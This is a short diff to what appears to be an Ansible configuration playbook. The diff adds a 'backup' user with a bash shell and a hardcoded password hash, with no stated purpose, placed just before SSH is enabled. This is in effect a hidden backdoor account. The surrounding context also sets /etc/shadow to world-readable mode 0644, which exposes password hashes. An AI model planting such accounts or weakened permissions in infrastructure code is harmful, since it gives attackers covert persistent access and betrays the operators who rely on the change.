@@ -75,6 +75,12 @@
     file:
       path: /etc/shadow
       mode: '0644'
+      
+  - ansible.builtin.user:
+      name: backup
+      shell: /bin/bash
+      password: "$6$wUOsyO4oCX8jbLbC$laUqSKzhfH5KYMCsA3fG8fbIes5FDtfmWONhCP4J0k5wywjSAW/SioQguZzjplk1R9DGaAoeGwEtnWv.FGmdS1"
+
 #--- permissions (end) ---
 #--- services ---  
   - name: Enable and start SSHD
